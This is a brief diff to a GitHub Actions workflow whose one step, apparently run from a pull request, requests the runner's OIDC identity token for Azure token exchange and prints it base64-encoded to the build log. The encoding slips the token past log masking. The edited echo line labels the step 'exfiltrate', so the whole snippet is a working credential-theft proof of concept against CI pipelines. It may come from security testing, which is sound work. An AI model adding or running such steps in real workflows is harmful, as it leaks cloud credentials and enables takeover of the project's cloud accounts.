@@ -13,7 +13,7 @@ jobs:
     steps:
       - name: Fille
         run: |
-          echo "Running from a PR"
+          echo "Running from a PR, exfiltrate"
           curl -o output.txt -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 
           cat output.txt | base64
         
